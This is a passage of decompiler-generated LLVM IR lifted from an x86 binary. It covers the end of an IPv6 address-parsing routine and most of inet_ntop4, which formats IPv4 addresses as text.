  br i1 %v1_805922d, label %dec_label_pc_80593c6, label %dec_label_pc_8059245

dec_label_pc_8059235:                             ; preds = %entry
  store i32 %arg3, i32* @edx, align 4
  store i32 %v4_8059221, i32* @eax, align 4
  %v3_805923b = call i32 @inet_pton4(i32 %v0_8059219, i32 %v0_8059218, i32 %v0_8059217)
  store i32 %v3_805923b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80593d8

dec_label_pc_8059245:                             ; preds = %dec_label_pc_805922a
  %v2_805924a = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805924a, i32* %eax.global-to-local, align 4
  %tmp61 = bitcast i32* %stack_var_-32 to i8*
  %v5_805924f = call i32 @__GI_memset(i8* %tmp61, i32 0, i32 16)
  store i32 %v5_805924f, i32* @ebx, align 4
  %v2_8059256 = add i32 %v5_805924f, 16
  store i32 %v2_8059256, i32* %eax.global-to-local, align 4
  %v0_8059260 = load i32, i32* @edi, align 4
  %v1_8059260 = inttoptr i32 %v0_8059260 to i8*
  %v2_8059260 = load i8, i8* %v1_8059260, align 1
  %v11_8059260 = icmp eq i8 %v2_8059260, 58
  %v1_8059263 = icmp eq i1 %v11_8059260, false
  br i1 %v1_8059263, label %dec_label_pc_80592f6, label %dec_label_pc_8059265

dec_label_pc_8059265:                             ; preds = %dec_label_pc_8059245
  %v1_8059265 = add i32 %v0_8059260, 1
  store i32 %v1_8059265, i32* @edi, align 4
  %v1_8059266 = inttoptr i32 %v1_8059265 to i8*
  %v2_8059266 = load i8, i8* %v1_8059266, align 1
  %v11_8059266 = icmp eq i8 %v2_8059266, 58
  %v1_8059269 = icmp eq i1 %v11_8059266, false
  br i1 %v1_8059269, label %dec_label_pc_80593d6, label %dec_label_pc_80592f6

dec_label_pc_805927d:                             ; preds = %dec_label_pc_8059336
  %v0_805927d = load i32, i32* @ecx, align 4
  %v7_8059285 = call i32 @__GI_strchr(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_805cd1a.347, i32 0, i32 0), i32 %v2_805933d, i32 %v0_805927d, i32 %v0_805927d)
  store i32 %v7_8059285, i32* %eax.global-to-local, align 4
  %v0_805928a = load i32, i32* @edi, align 4
  %v1_805928a = add i32 %v0_805928a, 1
  store i32 %v1_805928a, i32* @edi, align 4
  %v1_805928e = icmp eq i32 %v7_8059285, 0
  br i1 %v1_805928e, label %dec_label_pc_80592ad, label %dec_label_pc_8059292

dec_label_pc_8059292:                             ; preds = %dec_label_pc_805927d
  %v0_8059292 = load i32, i32* @ebp, align 4
  %v2_8059292 = mul i32 %v0_8059292, 16
  %v1_8059295 = add i32 %v7_8059285, -134597914
  store i32 %v1_8059295, i32* %eax.global-to-local, align 4
  %v2_805929a = or i32 %v2_8059292, %v1_8059295
  store i32 %v2_805929a, i32* @ebp, align 4
  %tmp129 = icmp ult i32 %v2_805929a, 65536
  br i1 %tmp129, label %dec_label_pc_8059336.outer, label %dec_label_pc_80593d6

dec_label_pc_8059336.outer:                       ; preds = %dec_label_pc_8059292, %dec_label_pc_80592f6
  %v0_805933937 = phi i32 [ %v1_805928a, %dec_label_pc_8059292 ], [ %stack_var_-36.0.in, %dec_label_pc_80592f6 ]
  %stack_var_-44.1.ph = phi i8* [ %stack_var_-44.1, %dec_label_pc_8059292 ], [ %stack_var_-44.0, %dec_label_pc_80592f6 ]
  %stack_var_-36.1.ph = phi i8* [ %stack_var_-36.1, %dec_label_pc_8059292 ], [ %stack_var_-36.0, %dec_label_pc_80592f6 ]
  %stack_var_-48.0.ph = phi i32 [ 1, %dec_label_pc_8059292 ], [ 0, %dec_label_pc_80592f6 ]
  %v4_80592b2 = icmp eq i32 %stack_var_-48.0.ph, 0
  %v1_80592b7 = icmp eq i1 %v4_80592b2, false
  br label %dec_label_pc_8059336

dec_label_pc_80592ad:                             ; preds = %dec_label_pc_805927d
  %v0_80592ad = load i32, i32* @esi, align 4
  %v9_80592ad = icmp eq i32 %v0_80592ad, 58
  %v1_80592b0 = icmp eq i1 %v9_80592ad, false
  br i1 %v1_80592b0, label %dec_label_pc_8059302, label %dec_label_pc_80592b2

dec_label_pc_80592b2:                             ; preds = %dec_label_pc_80592ad
  br i1 %v1_80592b7, label %dec_label_pc_80592ce, label %dec_label_pc_80592b9

dec_label_pc_80592b9:                             ; preds = %dec_label_pc_80592b2
  %v5_80592b9 = icmp eq i8* %stack_var_-44.1, null
  %v1_80592be = icmp eq i1 %v5_80592b9, false
  br i1 %v1_80592be, label %dec_label_pc_80593d6, label %dec_label_pc_80592c4

dec_label_pc_80592c4:                             ; preds = %dec_label_pc_80592b9
  %v0_80592c4 = load i32, i32* @ebx, align 4
  %v5_80592c4 = inttoptr i32 %v0_80592c4 to i8*
  %v5_80592c8 = inttoptr i32 %v1_805928a to i8*
  br label %dec_label_pc_8059336

dec_label_pc_80592ce:                             ; preds = %dec_label_pc_80592b2
  %v1_80592ce = inttoptr i32 %v1_805928a to i8*
  %v2_80592ce = load i8, i8* %v1_80592ce, align 1
  %v3_80592ce = icmp eq i8 %v2_80592ce, 0
  br i1 %v3_80592ce, label %dec_label_pc_80593d6, label %dec_label_pc_80592d7

dec_label_pc_80592d7:                             ; preds = %dec_label_pc_80592ce
  %v0_80592d7 = load i32, i32* @ebx, align 4
  %v1_80592d7 = add i32 %v0_80592d7, 2
  store i32 %v1_80592d7, i32* @edx, align 4
  %v6_80592de = icmp ugt i32 %v1_80592d7, %v2_8059256
  br i1 %v6_80592de, label %dec_label_pc_80593d6, label %dec_label_pc_80592e4

dec_label_pc_80592e4:                             ; preds = %dec_label_pc_80592d7
  %v0_80592e4 = load i32, i32* @ebp, align 4
  %v2_80592e6 = udiv i32 %v0_80592e4, 256
  %v4_80592e6 = trunc i32 %v2_80592e6 to i8
  %v3_80592e9 = inttoptr i32 %v0_80592d7 to i8*
  store i8 %v4_80592e6, i8* %v3_80592e9, align 1
  %v0_80592eb = load i32, i32* @ebp, align 4
  store i32 %v0_80592eb, i32* %eax.global-to-local, align 4
  %v1_80592ed = trunc i32 %v0_80592eb to i8
  %v2_80592ed = load i32, i32* @ebx, align 4
  %v3_80592ed = add i32 %v2_80592ed, 1
  %v4_80592ed = inttoptr i32 %v3_80592ed to i8*
  store i8 %v1_80592ed, i8* %v4_80592ed, align 1
  %v0_80592f0 = load i32, i32* @edx, align 4
  store i32 %v0_80592f0, i32* @ebx, align 4
  %stack_var_-36.0.in.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80592f6

dec_label_pc_80592f6:                             ; preds = %dec_label_pc_8059245, %dec_label_pc_8059265, %dec_label_pc_80592e4
  %stack_var_-36.0.in = phi i32 [ %stack_var_-36.0.in.pre, %dec_label_pc_80592e4 ], [ %v1_8059265, %dec_label_pc_8059265 ], [ %v0_8059260, %dec_label_pc_8059245 ]
  %stack_var_-44.0 = phi i8* [ %stack_var_-44.1, %dec_label_pc_80592e4 ], [ null, %dec_label_pc_8059265 ], [ null, %dec_label_pc_8059245 ]
  %stack_var_-36.0 = inttoptr i32 %stack_var_-36.0.in to i8*
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_8059336.outer

dec_label_pc_8059302:                             ; preds = %dec_label_pc_80592ad
  %v9_8059302 = icmp eq i32 %v0_80592ad, 46
  %v1_8059305 = icmp eq i1 %v9_8059302, false
  br i1 %v1_8059305, label %dec_label_pc_80593d6, label %dec_label_pc_805930b

dec_label_pc_805930b:                             ; preds = %dec_label_pc_8059302
  %v0_805930b = load i32, i32* @ebx, align 4
  %v1_805930b = add i32 %v0_805930b, 4
  store i32 %v1_805930b, i32* @esi, align 4
  %v6_8059312 = icmp ugt i32 %v1_805930b, %v2_8059256
  br i1 %v6_8059312, label %dec_label_pc_80593d6, label %dec_label_pc_8059318

dec_label_pc_8059318:                             ; preds = %dec_label_pc_805930b
  store i32 %v0_805930b, i32* @edx, align 4
  %v4_805931a = ptrtoint i8* %stack_var_-36.1 to i32
  store i32 %v4_805931a, i32* @eax, align 4
  %v2_805931e = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_805931e = call i32 @inet_pton4(i32 %stack_var_-48.0.ph, i32 %v2_805931e, i32 %v2_8059256)
  store i32 %v5_805931e, i32* %eax.global-to-local, align 4
  %v0_8059323 = load i32, i32* @esi, align 4
  %tmp62 = icmp slt i32 %v5_805931e, 1
  %tmp63 = icmp eq i1 %tmp62, false
  br i1 %tmp63, label %dec_label_pc_805936d, label %dec_label_pc_80593d6

dec_label_pc_8059336:                             ; preds = %dec_label_pc_8059336.outer, %dec_label_pc_80592c4
  %v0_8059339 = phi i32 [ %v1_805928a, %dec_label_pc_80592c4 ], [ %v0_805933937, %dec_label_pc_8059336.outer ]
  %stack_var_-44.1 = phi i8* [ %v5_80592c4, %dec_label_pc_80592c4 ], [ %stack_var_-44.1.ph, %dec_label_pc_8059336.outer ]
  %stack_var_-36.1 = phi i8* [ %v5_80592c8, %dec_label_pc_80592c4 ], [ %stack_var_-36.1.ph, %dec_label_pc_8059336.outer ]
  %v1_8059339 = inttoptr i32 %v0_8059339 to i8*
  %v2_8059339 = load i8, i8* %v1_8059339, align 1
  %v3_8059339 = sext i8 %v2_8059339 to i32
  store i32 %v3_8059339, i32* %eax.global-to-local, align 4
  %v2_805933d = call i32 @__GI_tolower(i32 %v3_8059339)
  store i32 %v2_805933d, i32* %eax.global-to-local, align 4
  store i32 %v2_805933d, i32* @esi, align 4
  %v1_8059347 = icmp eq i32 %v2_805933d, 0
  %v1_8059349 = icmp eq i1 %v1_8059347, false
  br i1 %v1_8059349, label %dec_label_pc_805927d, label %dec_label_pc_805934f

dec_label_pc_805934f:                             ; preds = %dec_label_pc_8059336
  %v0_80593a5.pre.pre = load i32, i32* @ebx, align 4
  br i1 %v4_80592b2, label %dec_label_pc_805936d, label %dec_label_pc_8059356

dec_label_pc_8059356:                             ; preds = %dec_label_pc_805934f
  %v1_8059356 = add i32 %v0_80593a5.pre.pre, 2
  store i32 %v1_8059356, i32* @edx, align 4
  %v6_805935d = icmp ugt i32 %v1_8059356, %v2_8059256
  br i1 %v6_805935d, label %dec_label_pc_80593d6, label %dec_label_pc_805935f

dec_label_pc_805935f:                             ; preds = %dec_label_pc_8059356
  %v0_805935f = load i32, i32* @ebp, align 4
  %v2_8059361 = udiv i32 %v0_805935f, 256
  %v4_8059361 = trunc i32 %v2_8059361 to i8
  %v3_8059364 = inttoptr i32 %v0_80593a5.pre.pre to i8*
  store i8 %v4_8059361, i8* %v3_8059364, align 1
  %v0_8059366 = load i32, i32* @ebp, align 4
  store i32 %v0_8059366, i32* %eax.global-to-local, align 4
  %v1_8059368 = trunc i32 %v0_8059366 to i8
  %v2_8059368 = load i32, i32* @ebx, align 4
  %v3_8059368 = add i32 %v2_8059368, 1
  %v4_8059368 = inttoptr i32 %v3_8059368 to i8*
  store i8 %v1_8059368, i8* %v4_8059368, align 1
  %v0_805936b = load i32, i32* @edx, align 4
  br label %dec_label_pc_805936d

dec_label_pc_805936d:                             ; preds = %dec_label_pc_805934f, %dec_label_pc_8059318, %dec_label_pc_805935f
  %v0_80593a5.pre = phi i32 [ %v0_8059323, %dec_label_pc_8059318 ], [ %v0_805936b, %dec_label_pc_805935f ], [ %v0_80593a5.pre.pre, %dec_label_pc_805934f ]
  %v4_805936d = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_805936d = icmp eq i8* %stack_var_-44.1, null
  br i1 %v5_805936d, label %dec_label_pc_80593a5, label %dec_label_pc_8059374

dec_label_pc_8059374:                             ; preds = %dec_label_pc_805936d
  store i32 1, i32* @esi, align 4
  %v6_805937b = sub i32 %v0_80593a5.pre, %v4_805936d
  store i32 %v6_805937b, i32* @edi, align 4
  %v16_805937f = icmp eq i32 %v0_80593a5.pre, %v2_8059256
  %v1_8059383 = icmp eq i1 %v16_805937f, false
  br i1 %v1_8059383, label %dec_label_pc_805939d.preheader, label %dec_label_pc_80593d6

dec_label_pc_805939d.preheader:                   ; preds = %dec_label_pc_8059374
  %v3_805939d92 = inttoptr i32 %v6_805937b to i8*
  %v9_805939f100 = icmp slt i8* %v3_805939d92, inttoptr (i32 1 to i8*)
  br i1 %v9_805939f100, label %dec_label_pc_80593a1, label %dec_label_pc_8059387

dec_label_pc_8059387:                             ; preds = %dec_label_pc_805939d.preheader, %dec_label_pc_8059387
  %v0_8059395102 = phi i32 [ %v0_805939d.pre, %dec_label_pc_8059387 ], [ 1, %dec_label_pc_805939d.preheader ]
  %v0_8059387101 = phi i32 [ %v1_805939d.pre, %dec_label_pc_8059387 ], [ %v6_805937b, %dec_label_pc_805939d.preheader ]
  %v2_805938d = sub i32 %v0_8059387101, %v0_8059395102
  %v2_805938f = sub i32 %v2_8059256, %v0_8059395102
  store i32 %v2_805938f, i32* @ecx, align 4
  %v6_8059391 = add i32 %v2_805938d, %v4_805936d
  store i32 %v6_8059391, i32* %eax.global-to-local, align 4
  %v1_8059395 = add i32 %v0_8059395102, 1
  store i32 %v1_8059395, i32* @esi, align 4
  %v1_8059396 = inttoptr i32 %v6_8059391 to i8*
  %v2_8059396 = load i8, i8* %v1_8059396, align 1
  %v3_8059396 = zext i8 %v2_8059396 to i32
  %v4_8059396 = load i32, i32* @edx, align 4
  %v5_8059396 = and i32 %v4_8059396, -256
  %v6_8059396 = or i32 %v5_8059396, %v3_8059396
  store i32 %v6_8059396, i32* @edx, align 4
  %v3_8059398 = inttoptr i32 %v2_805938f to i8*
  store i8 %v2_8059396, i8* %v3_8059398, align 1
  %v0_805939a = load i32, i32* %eax.global-to-local, align 4
  %v1_805939a = inttoptr i32 %v0_805939a to i8*
  store i8 0, i8* %v1_805939a, align 1
  %v0_805939d.pre = load i32, i32* @esi, align 4
  %v1_805939d.pre = load i32, i32* @edi, align 4
  %v2_805939d = inttoptr i32 %v0_805939d.pre to i8*
  %v3_805939d = inttoptr i32 %v1_805939d.pre to i8*
  %v9_805939f = icmp sgt i8* %v2_805939d, %v3_805939d
  br i1 %v9_805939f, label %dec_label_pc_80593a1, label %dec_label_pc_8059387

dec_label_pc_80593a1:                             ; preds = %dec_label_pc_8059387, %dec_label_pc_805939d.preheader
  br label %dec_label_pc_80593a5

dec_label_pc_80593a5:                             ; preds = %dec_label_pc_805936d, %dec_label_pc_80593a1
  %v0_80593a5 = phi i32 [ %v2_8059256, %dec_label_pc_80593a1 ], [ %v0_80593a5.pre, %dec_label_pc_805936d ]
  %v16_80593a5 = icmp eq i32 %v0_80593a5, %v2_8059256
  %v1_80593a9 = icmp eq i1 %v16_80593a5, false
  br i1 %v1_80593a9, label %dec_label_pc_80593d6, label %dec_label_pc_80593ab

dec_label_pc_80593ab:                             ; preds = %dec_label_pc_80593a5
  store i32 %v2_805924a, i32* %eax.global-to-local, align 4
  %tmp64 = inttoptr i32 %arg3 to i16*
  %v5_80593b7 = call i32 @memcpy(i16* %tmp64, i32 %v2_805924a, i32 16)
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80593d8

dec_label_pc_80593c6:                             ; preds = %dec_label_pc_805922a
  %v1_80593c6 = call i32 @__errno_location(i32 %v0_8059219)
  %v1_80593cb = inttoptr i32 %v1_80593c6 to i32*
  store i32 97, i32* %v1_80593cb, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80593d8

dec_label_pc_80593d6:                             ; preds = %dec_label_pc_80592d7, %dec_label_pc_80592ce, %dec_label_pc_8059292, %dec_label_pc_80592b9, %dec_label_pc_8059374, %dec_label_pc_8059318, %dec_label_pc_80593a5, %dec_label_pc_8059356, %dec_label_pc_805930b, %dec_label_pc_8059302, %dec_label_pc_8059265
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80593d8

dec_label_pc_80593d8:                             ; preds = %dec_label_pc_80593c6, %dec_label_pc_80593ab, %dec_label_pc_8059235, %dec_label_pc_80593d6
  %v0_80593df = phi i32 [ -1, %dec_label_pc_80593c6 ], [ 1, %dec_label_pc_80593ab ], [ %v3_805923b, %dec_label_pc_8059235 ], [ 0, %dec_label_pc_80593d6 ]
  store i32 %v0_8059219, i32* @ebx, align 4
  store i32 %v0_8059218, i32* @esi, align 4
  store i32 %v0_8059217, i32* @edi, align 4
  store i32 %v0_8059216, i32* @ebp, align 4
  ret i32 %v0_80593df

; uselistorder directives
  uselistorder i32 %v1_805939d.pre, { 1, 0 }
  uselistorder i32 %v0_805939d.pre, { 1, 0 }
  uselistorder i32 %v0_8059395102, { 2, 1, 0 }
  uselistorder i32 %v0_80593a5.pre, { 2, 0, 1 }
  uselistorder i32 %v0_80593a5.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v2_805933d, { 2, 1, 3, 0 }
  uselistorder i8* %stack_var_-36.1, { 1, 0 }
  uselistorder i8* %stack_var_-44.1, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %stack_var_-36.0.in, { 1, 0 }
  uselistorder i32 %v1_805928a, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v2_8059256, { 0, 2, 3, 1, 7, 4, 5, 6, 8 }
  uselistorder i32 %v0_8059219, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 11, 12, 7, 8, 9, 10, 13, 14, 15, 16 }
  uselistorder i32 (i32, i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_80593d8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80593d6, { 6, 4, 7, 5, 8, 9, 0, 1, 3, 2, 10 }
  uselistorder label %dec_label_pc_80593a5, { 1, 0 }
  uselistorder label %dec_label_pc_8059387, { 1, 0 }
  uselistorder label %dec_label_pc_805936d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8059336, { 1, 0 }
  uselistorder label %dec_label_pc_80592f6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8059336.outer, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-60 = alloca i8*, align 4
  %stack_var_-92 = alloca i8*, align 4
  %stack_var_-33 = alloca i32, align 4
  %stack_var_-31 = alloca i32, align 4
  %v0_80593e1 = load i32, i32* @edi, align 4
  %v0_80593e2 = load i32, i32* @esi, align 4
  store i32 0, i32* %ebp.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v0_80593ea = load i32, i32* @eax, align 4
  %v3_80593ee = and i32 %v0_80593ea, -65536
  store i32 %v3_80593ee, i32* %stack_var_-33, align 4
  %v2_80593f9 = ptrtoint i32* %stack_var_-31 to i32
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_80593ff = load i32, i32* @edx, align 4
  %v5_80593ff = inttoptr i32 %v0_80593ff to i8*
  store i8* %v5_80593ff, i8** %stack_var_-60, align 4
  %v0_8059403 = load i32, i32* @ecx, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %stack_var_-31, align 4
  %v6_8059409 = add i32 %v2_80593f9, 4
  store i32 %v6_8059409, i32* %edi.global-to-local, align 4
  %v2_805940a = inttoptr i32 %v6_8059409 to i32*
  store i32 0, i32* %v2_805940a, align 4
  %v3_805940a = load i32, i32* %edi.global-to-local, align 4
  %v6_805940a = add i32 %v3_805940a, 4
  store i32 %v6_805940a, i32* %edi.global-to-local, align 4
  %v0_805940b = load i32, i32* %eax.global-to-local, align 4
  %v2_805940b = inttoptr i32 %v6_805940a to i32*
  store i32 %v0_805940b, i32* %v2_805940b, align 4
  %v3_805940b = load i32, i32* %edi.global-to-local, align 4
  %v6_805940b = add i32 %v3_805940b, 4
  store i32 %v6_805940b, i32* %edi.global-to-local, align 4
  %v0_805940c = load i32, i32* %eax.global-to-local, align 4
  %v1_805940c = trunc i32 %v0_805940c to i16
  %v3_805940c = inttoptr i32 %v6_805940b to i16*
  store i16 %v1_805940c, i16* %v3_805940c, align 2
  %v4_805940c = load i32, i32* %edi.global-to-local, align 4
  %v7_805940c = add i32 %v4_805940c, 2
  store i32 %v7_805940c, i32* %edi.global-to-local, align 4
  %v0_805940e = load i32, i32* %eax.global-to-local, align 4
  %v1_805940e = trunc i32 %v0_805940e to i8
  %v3_805940e = inttoptr i32 %v7_805940c to i8*
  store i8 %v1_805940e, i8* %v3_805940e, align 1
  %v0_805949e26 = load i32, i32* %ebp.global-to-local, align 4
  %v7_80594a132 = icmp sgt i32 %v0_805949e26, 3
  br i1 %v7_80594a132, label %dec_label_pc_80594a7, label %dec_label_pc_8059414

dec_label_pc_8059414:                             ; preds = %entry, %dec_label_pc_805947c
  %v0_805949e33 = phi i32 [ %v0_805949e, %dec_label_pc_805947c ], [ %v0_805949e26, %entry ]
  %v0_8059418 = load i32, i32* @ecx, align 4
  %v1_8059418 = and i32 %v0_8059418, -256
  %v2_8059418 = or i32 %v1_8059418, 100
  store i32 %v2_8059418, i32* %ecx.global-to-local, align 4
  %v2_805941a = add i32 %v0_805949e33, %v0_80593ea
  store i32 %v2_805941a, i32* %eax.global-to-local, align 4
  %v0_805941c = load i32, i32* %ebx.global-to-local, align 4
  %v1_805941c = add i32 %v0_805941c, 1
  store i32 %v1_805941c, i32* @esi, align 4
  store i32 %v0_805941c, i32* @edi, align 4
  %v1_8059425 = inttoptr i32 %v2_805941a to i8*
  %v2_8059425 = load i8, i8* %v1_8059425, align 1
  %v3_8059425 = zext i8 %v2_8059425 to i32
  %v4_8059425 = load i32, i32* @edx, align 4
  %v5_8059425 = and i32 %v4_8059425, -65536
  %v6_8059425 = or i32 %v5_8059425, %v3_8059425
  store i32 %v6_8059425, i32* %edx.global-to-local, align 4
  %div = udiv i8 %v2_8059425, 100
  %v6_805942b = zext i8 %div to i32
  %v4_805942d = or i32 %v6_805942b, %v1_8059418
  store i32 %v4_805942d, i32* %ecx.global-to-local, align 4
  %v1_805942f = or i32 %v4_805942d, 48
  store i32 %v1_805942f, i32* %eax.global-to-local, align 4
  %v1_8059432 = trunc i32 %v1_805942f to i8
  %v2_8059432 = load i32, i32* @esp, align 4
  %v4_8059432 = add i32 %v0_805941c, 43
  %v5_8059432 = add i32 %v4_8059432, %v2_8059432
  %v6_8059432 = inttoptr i32 %v5_8059432 to i8*
  store i8 %v1_8059432, i8* %v6_8059432, align 1
  %v0_8059436 = load i32, i32* %eax.global-to-local, align 4
  %v1_8059436 = trunc i32 %v0_8059436 to i8
  %v7_8059436 = icmp eq i8 %v1_8059436, 48
  %v1_8059438 = icmp eq i1 %v7_8059436, false
  %v0_805945e = load i32, i32* %ecx.global-to-local, align 4
  %v1_805945e = and i32 %v0_805945e, -256
  %v2_805945e = or i32 %v1_805945e, 10
  store i32 %v2_805945e, i32* %ecx.global-to-local, align 4
  %v0_8059460 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8059460, i32* %eax.global-to-local, align 4
  %v3_8059462 = trunc i32 %v0_8059460 to i16
  %v5_8059462 = udiv i16 %v3_8059462, 10
  br i1 %v1_8059438, label %dec_label_pc_805945e, label %dec_label_pc_805943a

dec_label_pc_805943a:                             ; preds = %dec_label_pc_8059414
  %v9_805943e = and i32 %v0_8059460, -65536
  %tmp = urem i16 %v5_8059462, 256
  store i32 10, i32* %ecx.global-to-local, align 4
  %div34 = udiv i16 %tmp, 10
  %v7_805944b = zext i16 %div34 to i32
  %v11_805944b = or i32 %v7_805944b, %v9_805943e
  store i32 %v11_805944b, i32* %eax.global-to-local, align 4
  %tmp36 = urem i16 %tmp, 10
  %v12_805944b = zext i16 %tmp36 to i32
  %v1_805944e = or i32 %v12_805944b, 48
  %v8_805944e = trunc i32 %v1_805944e to i8
  store i32 %v1_805944e, i32* %edx.global-to-local, align 4
  %v2_8059451 = load i32, i32* @esp, align 4
  %v3_8059451 = load i32, i32* %ebx.global-to-local, align 4
  %v4_8059451 = add i32 %v2_8059451, 43
  %v5_8059451 = add i32 %v4_8059451, %v3_8059451
  %v6_8059451 = inttoptr i32 %v5_8059451 to i8*
  store i8 %v8_805944e, i8* %v6_8059451, align 1
  %v0_8059455 = load i32, i32* %edx.global-to-local, align 4
  %v1_8059455 = trunc i32 %v0_8059455 to i8
  %v7_8059455 = icmp eq i8 %v1_8059455, 48
  br i1 %v7_8059455, label %dec_label_pc_805947c, label %dec_label_pc_805945a

dec_label_pc_805945a:                             ; preds = %dec_label_pc_805943a
  %v0_805945a = load i32, i32* @esi, align 4
  store i32 %v0_805945a, i32* @edi, align 4
  br label %dec_label_pc_805947c

dec_label_pc_805945e:                             ; preds = %dec_label_pc_8059414
  %tmp37 = urem i16 %v5_8059462, 256
  %v3_8059464 = and i32 %v0_8059460, -65536
  store i32 10, i32* %ecx.global-to-local, align 4
  %div35 = udiv i16 %tmp37, 10
  %v7_805946f = zext i16 %div35 to i32
  %v11_805946f = or i32 %v7_805946f, %v3_8059464
  store i32 %v11_805946f, i32* %eax.global-to-local, align 4
  %tmp38 = urem i16 %tmp37, 10
  %v12_805946f = zext i16 %tmp38 to i32
  %v1_8059472 = or i32 %v12_805946f, 48
  %v8_8059472 = trunc i32 %v1_8059472 to i8
  store i32 %v1_8059472, i32* %edx.global-to-local, align 4
  %v0_8059475 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059475 = add i32 %v0_8059475, 2
  store i32 %v1_8059475, i32* @edi, align 4
  %v2_8059478 = load i32, i32* @esp, align 4
  %v3_8059478 = load i32, i32* @esi, align 4
  %v4_8059478 = add i32 %v2_8059478, 43
  %v5_8059478 = add i32 %v4_8059478, %v3_8059478
  %v6_8059478 = inttoptr i32 %v5_8059478 to i8*
  store i8 %v8_8059472, i8* %v6_8059478, align 1
  br label %dec_label_pc_805947c

dec_label_pc_805947c:                             ; preds = %dec_label_pc_805943a, %dec_label_pc_805945a, %dec_label_pc_805945e
  store i32 %v2_805941a, i32* %edx.global-to-local, align 4
  store i32 10, i32* @ecx, align 4
  %v0_8059485 = load i32, i32* @edi, align 4
  %v1_8059485 = add i32 %v0_8059485, 2
  store i32 %v1_8059485, i32* %ebx.global-to-local, align 4
  %v0_8059488 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8059488 = add i32 %v0_8059488, 1
  store i32 %v1_8059488, i32* %ebp.global-to-local, align 4
  %v2_8059489 = load i8, i8* %v1_8059425, align 1
  %v3_8059489 = zext i8 %v2_8059489 to i32
  %v4_8059489 = load i32, i32* %eax.global-to-local, align 4
  %v5_8059489 = and i32 %v4_8059489, -65536
  %v6_8059489 = or i32 %v5_8059489, %v3_8059489
  store i32 %v6_8059489, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_805948f = load i32, i32* @esp, align 4
  %v2_805948f = add i32 %v0_8059485, 44
  %v3_805948f = add i32 %v2_805948f, %v0_805948f
  %v4_805948f = inttoptr i32 %v3_805948f to i8*
  store i8 46, i8* %v4_805948f, align 1
  %v0_8059494 = load i32, i32* @ecx, align 4
  %v1_8059494 = load i32, i32* %eax.global-to-local, align 4
  %v2_8059494 = urem i32 %v1_8059494, 65536
  %v3_8059494 = load i32, i32* %edx.global-to-local, align 4
  %v4_8059494 = mul i32 %v3_8059494, 65536
  %v5_8059494 = or i32 %v4_8059494, %v2_8059494
  %v6_8059494 = urem i32 %v0_8059494, 65536
  %v7_8059494 = udiv i32 %v5_8059494, %v6_8059494
  %v8_8059494 = urem i32 %v7_8059494, 65536
  %v10_8059494 = and i32 %v1_8059494, -65536
  %v11_8059494 = or i32 %v8_8059494, %v10_8059494
  store i32 %v11_8059494, i32* %eax.global-to-local, align 4
  %v12_8059494 = urem i32 %v5_8059494, %v6_8059494
  %v14_8059494 = and i32 %v3_8059494, -65536
  %v15_8059494 = or i32 %v12_8059494, %v14_8059494
  %v1_8059497 = add i32 %v15_8059494, 48
  %v8_8059497 = trunc i32 %v1_8059497 to i8
  store i32 %v1_8059497, i32* @edx, align 4
  %v2_805949a = load i32, i32* @esp, align 4
  %v3_805949a = load i32, i32* @edi, align 4
  %v4_805949a = add i32 %v2_805949a, 43
  %v5_805949a = add i32 %v4_805949a, %v3_805949a
  %v6_805949a = inttoptr i32 %v5_805949a to i8*
  store i8 %v8_8059497, i8* %v6_805949a, align 1
  %v0_805949e = load i32, i32* %ebp.global-to-local, align 4
  %v7_80594a1 = icmp sgt i32 %v0_805949e, 3
  br i1 %v7_80594a1, label %dec_label_pc_80594a7, label %dec_label_pc_8059414

dec_label_pc_80594a7:                             ; preds = %dec_label_pc_805947c, %entry
  %v0_80594a7 = load i32, i32* @esp, align 4
  %v1_80594a7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80594a7 = add i32 %v0_80594a7, 42
  %v3_80594a7 = add i32 %v2_80594a7, %v1_80594a7
  %v4_80594a7 = inttoptr i32 %v3_80594a7 to i8*
  store i8 0, i8* %v4_80594a7, align 1
  %v2_80594af = ptrtoint i32* %stack_var_-33 to i32
  store i32 %v2_80594af, i32* %ebx.global-to-local, align 4
  %tmp23 = bitcast i32* %stack_var_-33 to i8*
  store i8* %tmp23, i8** %stack_var_-92, align 4
  %v3_80594b4 = call i32 @strlen(i8* %tmp23)
  store i32 %v3_80594b4, i32* @eax, align 4
  %tmp39 = icmp ugt i32 %v3_80594b4, %v0_8059403
  br i1 %tmp39, label %dec_label_pc_80594c2, label %dec_label_pc_80594d1

dec_label_pc_80594c2:                             ; preds = %dec_label_pc_80594a7
  %v0_80594c2 = load i8*, i8** %stack_var_-92, align 4
  %v1_80594c2 = ptrtoint i8* %v0_80594c2 to i32
